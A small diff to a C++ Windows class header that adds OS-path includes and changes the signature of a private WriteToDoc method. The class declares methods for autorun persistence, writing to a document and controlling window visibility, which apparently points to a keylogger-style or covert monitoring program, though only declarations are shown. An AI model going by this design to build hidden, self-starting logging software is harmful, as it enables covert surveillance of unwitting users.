@@ -17,7 +17,10 @@
 
 #include <iostream>
 #include <Windows.h>
+#include "os_paths/windows_os_paths.h"
+#include "os_paths/linux_os_paths.h"
 #include <fstream>
+#include <stdlib.h>
 #include <string>
 #include <time.h>
 #include <stdio.h>
@@ -37,7 +40,7 @@ public:
 	void AddToAutorun();
 
 private:
-	void WriteToDoc(const LPCSTR text);
+	void WriteToDoc(const LPCSTR text, WindowsOSPath windows_path);
 
 protected:
 	void VisibilityApp();
